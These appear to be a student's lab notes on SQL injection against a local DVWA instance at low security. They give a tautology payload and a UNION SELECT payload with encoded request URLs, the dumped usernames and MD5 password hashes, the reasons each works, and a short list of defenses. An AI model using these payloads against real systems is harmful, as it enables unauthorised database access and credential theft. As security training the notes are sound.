Task 3 — SQL Injection Notes (DVWA, Low Security)

 Environment
- Target: DVWA running locally on Kali Linux (Apache2, MariaDB, PHP 8.4.24)
- Module: SQL Injection
- Security level: Low
- URL: http://localhost/DVWA/vulnerabilities/sqli/

---

Payload 1 — Authentication Bypass
**Payload:** `' OR '1'='1`

**Request URL:** http://localhost/DVWA/vulnerabilities/sqli/?id='+OR+'1'%3D'1&Submit=Submit#

**Result:** Returned *all* rows in the `users` table instead of a single user.

**Reason:** The input was directly concatenated into the SQL query:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '$id';

Adding ' OR '1'='1 made the condition always true, bypassing the intended filter.

PAYLOAD 2
UNION-Based Data Extraction
Payload: ' UNION SELECT user, password FROM users -- -
http://localhost/DVWA/vulnerabilities/sqli/?id='+UNION+SELECT+user%2C+password+FROM+users+--+-
Result: Displayed username and password hashes in the output field
admin → 5f4dcc3b5aa765d61d8327deb882cf99

gordonb → e99a18c428cb38d5f260853678922e03

1337 → 8d3533d75ae2c3966d7e0d4fcc69216b

pablo → 0d107d09f5bbe40cade3de5c71e9e9b7

smithy → 5f4dcc3b5aa765d61d8327deb882cf99

Reason: UNION SELECT allowed combining attacker‑chosen results with the original query. Since the form expected two columns, selecting user and password aligned perfectly. The -- - commented out the rest of the query.

Notable finding: Both admin and smithy accounts used the same password hash (5f4dcc3b5aa765d61d8327deb882cf99), which is the MD5 hash of “password.” In a real system, this would mean both accounts are compromised once the hash is cracked.

IMPORTANT THINGS TO NOTE
Authentication bypass shows how weak input handling can expose all records.

UNION injection demonstrates how attackers can extract sensitive data like usernames and password hashes.

Proper defenses include parameterized queries, input validation, and least privilege database accounts.

